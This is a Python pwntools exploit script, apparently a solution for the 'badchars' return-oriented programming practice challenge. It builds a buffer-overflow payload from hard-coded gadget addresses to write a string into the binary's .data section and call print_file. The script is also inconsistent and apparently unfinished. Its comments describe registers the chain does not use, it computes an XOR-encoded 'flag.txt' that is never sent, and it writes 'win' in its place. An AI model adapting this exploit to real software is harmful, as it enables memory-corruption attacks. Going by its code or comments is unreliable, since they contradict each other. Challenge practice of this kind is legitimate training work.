from pwn import *

#declaring binaries, elf, libc
context.binary = binary = './badchars'
context.arch = 'amd64'
context.log_level = 'info'
elf = ELF(binary)
rop = ROP(elf)

#helper functions
def ASCII_to_Hex(value):
    res = ""
    for i in value:
    	res += hex(ord(i))[2:]
    return res
def changeEndian(value):
    length = len(value)
    res = "0x"
    for i in range(length-1, 0, -2):
        res += value[i-1]+ value[i]
    return res
def generateString(value):
    return int(changeEndian(ASCII_to_Hex(value)), 16)

def encode_badchars(data, badchars, key):
    result = b""
    for b in data:
        if b in badchars:
            result += bytes([b ^ ord(key)])
            continue
        result += bytes([b])
    return result

#encoding the flag.txt value
# Alphabets
badchars = b"xga.\n\r"
key = b"\x90"
target = encode_badchars(b"flag.txt", badchars, key)
info(f'XOR Key: {key}')
info(f'Encoded target: {target}')


# useful gadgets
#0x0000000000400634 : mov qword ptr [r13], r12 ; ret
#0x00601028 .data address to write string flag.txt
#0x00000000004006a3 : pop rdi ; ret
#0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

#badchars are: 'x', 'g', 'a', '.'

#payload, symbols, rop chains,
padding = b'A'*40  			#filling up buffer with junk
pop_r12_r13_r14_r15 = p64(0x000040069c)	#pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret poping registers
empty = p64(0x00601028)                 #filling the extra popped registers, r14 r15
r13 = p64(0x00601029)			#.data address which will have an address to our value after mov (for r14 cuz it's derefernced)
r12 = p64(generateString("win"))	#using helper functions to convert value to hex and little endian (for r15)
xor_r15_r14_ret = p64(0x00400628)#
mov_r13_r12 = p64(0x0000000000400634)	#mov qword ptr [r14], r15 ; ret This moves the flag.txt value into the r14 register
pop_rdi = p64(0x00000000004006a3)	#pop rdi ; ret
print_file = p64(0x0000000000400510)	#print_file function address



#popping/emptying registers and specifying the values for them, in this case, empty r14,15 and then r14,15
#we need two registers, one writable(r14) and one to temporarily "hold" our value(r15)
payload = padding + pop_r12_r13_r14_r15 + r12 + r13 + empty + empty + mov_r13_r12 + pop_rdi + r13 + print_file


#sending payload, process interaction
io = process(binary)

#debugging with gdb
#gdbscript = ""
#pid = gdb.attach(io, gdbscript=gdbscript)

io.sendlineafter(b'> ', payload)

io.interactive()
